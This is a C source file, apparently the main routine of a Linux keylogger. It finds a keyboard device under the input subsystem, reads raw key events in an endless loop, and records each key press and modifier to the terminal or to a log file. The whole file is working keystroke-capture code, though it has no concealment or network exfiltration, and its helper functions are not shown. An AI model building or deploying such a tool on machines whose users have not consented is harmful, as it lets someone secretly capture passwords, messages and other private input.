#include <fcntl.h>
#include <linux/input-event-codes.h>
#include <linux/input.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

#include "keylogger.h"

int main(int argc, char *argv[]) {
    bool log_to_file = false;
    const char *target_device_name = NULL;

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-w") == 0) {
            log_to_file = true;
        } else if (strcmp(argv[i], "-dev") == 0 && (i + 1) < argc) {
            target_device_name = argv[++i];
        }
    }

    char *keyboard_path = find_keyboard_device(target_device_name);
    if (!keyboard_path) {
        fprintf(stderr, "No keyboard device found");
        if (target_device_name) {
            fprintf(stderr, " with name: %s\n", target_device_name);
        } else {
            fprintf(stderr, "\n");
        }
        return EXIT_FAILURE;
    }

    printf("Using keyboard device: %s\n", keyboard_path);

    FILE *fp = NULL;
    if (log_to_file) {
        fp = fopen(LOG_FILE, "w");
        if (!fp) {
            perror("Cannot open log file");
            return EXIT_FAILURE;
        }
    }

    int fd = open(keyboard_path, O_RDONLY);
    if (fd == -1) {
        perror("Cannot open keyboard device");
        if (fp) fclose(fp);
        return EXIT_FAILURE;
    }

    struct input_event event;
    bool shift_pressed = false, ctrl_pressed = false, meta_pressed = false, alt_pressed = false,
         capslock_active = false;

    while (true) {
        ssize_t bytes_read = read(fd, &event, sizeof(event));
        if (bytes_read == sizeof(event)) {
            if (event.type == EV_KEY) {
                // Update status modifier keys
                if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                    shift_pressed = event.value;
                } else if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                    ctrl_pressed = event.value;
                } else if (event.code == KEY_LEFTMETA || event.code == KEY_RIGHTMETA) {
                    meta_pressed = event.value;
                } else if (event.code == KEY_LEFTALT || event.code == KEY_RIGHTALT) {
                    alt_pressed = event.value;
                }
                // Log modifier keys independently
                if (event.value == 1) {
                    if (event.code == KEY_CAPSLOCK) {
                        capslock_active = !capslock_active;
                    }
                    if (event.code == KEY_LEFTSHIFT || event.code == KEY_RIGHTSHIFT) {
                        log_key(fp, ctrl_pressed, meta_pressed, alt_pressed, log_to_file, "Shift");
                    } else if (event.code == KEY_LEFTCTRL || event.code == KEY_RIGHTCTRL) {
                        log_key(fp, ctrl_pressed, meta_pressed, alt_pressed, log_to_file, "Ctrl");
                    } else if (event.code == KEY_LEFTMETA || event.code == KEY_RIGHTMETA) {
                        log_key(fp, ctrl_pressed, meta_pressed, alt_pressed, log_to_file, "Meta");
                    } else if (event.code == KEY_LEFTALT || event.code == KEY_RIGHTALT) {
                        log_key(fp, ctrl_pressed, meta_pressed, alt_pressed, log_to_file, "Alt");
                    }
                    // Log other keys
                    const char *key_name = get_key_name(event.code, shift_pressed, capslock_active);
                    if (strcmp(key_name, "UNKNOWN") != 0) {
                        log_key(fp, ctrl_pressed, meta_pressed, alt_pressed, log_to_file, key_name);
                    }
                }
            }
        } else if (bytes_read == -1) {
            perror("Error reading from keyboard device");
            break;
        }
    }

    if (close(fd) == -1) {
        perror("Error closing keyboard device");
    }
    if (fp) {
        if (fclose(fp) == -1) {
            perror("Error closing log file");
        }
    }
    return EXIT_SUCCESS;
}
